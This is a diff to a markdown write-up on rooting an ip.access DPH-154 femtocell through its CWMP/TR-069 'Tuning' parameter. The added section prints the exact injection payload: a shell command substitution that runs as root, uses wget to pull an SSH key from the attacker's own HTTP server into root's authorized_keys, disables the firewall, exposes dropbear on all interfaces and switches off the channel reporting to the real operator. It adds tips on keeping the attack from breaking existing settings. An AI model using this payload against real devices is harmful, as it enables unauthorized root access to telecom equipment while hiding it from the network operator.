@@ -215,6 +215,37 @@ device DIALS OUT (CWMP)
 > the subshell cannot change the parent environment, so the flag must be written to the file and the
 > box booted again. **Here, anything that opens a shell fires it.**
 
+### 🎯 **THE ACTUAL WRITE, AS IT WAS SENT — FOUR VARIABLES IN ONE SPV**
+
+```
+Device.X_00000C_LogUpload.Tuning  =
+  "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && wget -q -O- http://<you>:8081/k
+                 >>/var/ipaccess/root_home/.ssh/authorized_keys);
+   ENV_FIREWALL_DISABLED:        TRUE;
+   ENV_VERBOSE_CONSOLE_ENABLED:  TRUE;
+   ENV_BASICOAM_DISABLED:        TRUE;"
+```
+⇒ ⭐⭐⭐ **THIS is why `Tuning` and not a URL-shaped attribute: you choose the variable NAMES, so the
+injection AND the three flags that make it useful land in a SINGLE write.**
+```
+ENV_XKINIT                    the injection. The $( ) runs as root when nv_env.sh is sourced.
+                              ⭐ the NAME is arbitrary — nothing consumes ENV_XKINIT. It exists
+                                 only to carry the substitution.
+ENV_FIREWALL_DISABLED  TRUE   so you can reach the port afterwards
+ENV_VERBOSE_CONSOLE_…  TRUE   so dropbear binds 0.0.0.0:22 instead of loopback
+ENV_BASICOAM_DISABLED  TRUE   ⬅ stops the unit's Basic-OAM channel phoning its real operator
+```
+⚠️ **The payload pulls the key from your own HTTP server (`:8081` here) rather than embedding it** —
+**one less quoting layer inside a string that is already being interpolated into a shell file.**
+
+> ### ⛔⛔ **`Tuning` IS A WHOLE-STRING REPLACE, AND THE REAL WRITE HAD TO CARRY SIX PRE-EXISTING KEYS**
+> **The device's live `Tuning` value already held keys. Sending only your own would have DELETED
+> them.** ⇒ ✅ **`GetParameterValues` on `Tuning` FIRST, re-send every key verbatim, then add yours.**
+> ⭐ **A DROPPED key is a visible omission; a STALE key looks like diligence — present, correctly
+> spelled, and wrong.** 📌 **One re-arm here nearly rewrote `ENV_FIREWALL_DISABLED` back to `FALSE`
+> from a readback taken before the firewall was ever opened — which would have closed tcp/22 on the
+> operator's own access.**
+
 ### 📋 **THE FIELD'S NORMAL, DOCUMENTED USE — and this part is PROVEN**
 
 **`Tuning` takes a `KEY: VALUE; KEY: VALUE` string and writes those into the NV environment.** That
@@ -263,19 +294,12 @@ ENV_DIAG_FILE_LIST: /var/ipaccess/.tamperInfo /var/ipaccess/nv_env.sh …
 > label in the upstream README sits on the TELNET one.** ⭐ **A DPH-154 has no Ralink at all, so A
 > cannot apply to it under any circumstances** — see [`MATRIX.md`](MATRIX.md).
 
-### 📌 **IT IS ONE MECHANISM WITH TWO DOORS — AND THE OTHER DOOR IS DMI**
+### 📌 **A NOTE ON THE DMI SIBLING, BECAUSE IT IS *NOT* THE 154 ROUTE**
 
-```
-CWMP  Device.X_00000C_LogUpload.Tuning       needs a CWMP SESSION   <- the 154's door
-DMI   diagnosticTuning  (attribute 2320)     needs a DMI CONSOLE    <- the 151/nano3G door
-        set diagnosticTuning=({name=ENV_VERBOSE_CONSOLE_ENABLED,value=TRUE})
-```
-⇒ ⭐⭐⭐ **Same sink, same lack of escaping, same `setnv_env.sh`.** **The 154 is not a harder target —
-it is the same target with the DMI console removed, and CWMP is the console it still answers on.**
-> ### ⚠️ **BOTH ARE WHOLE-COLLECTION REPLACES, NOT MERGES**
-> **`Tuning` is a whole-STRING replace; `diagnosticTuning` is a whole-LIST replace.** ⛔ **Read the
-> current value before writing, or you will silently drop every key you are not thinking about —
-> including the one holding your own access open.**
+**The same sink is reachable on a nano3G through DMI attribute `diagnosticTuning` (2320)**, and it
+was played with here. ⛔ **It is NOT how this unit was entered and it does not apply to a 154 —
+which has no DMI console at all.** 📌 **Documented where it belongs: [`ACCESS.md`](ACCESS.md)
+Route 6.** ⭐ **On a 154 the ACS is the console.**
 
 ### 🚪 A second, WEAKER door on the same sink — and why it is weaker
 
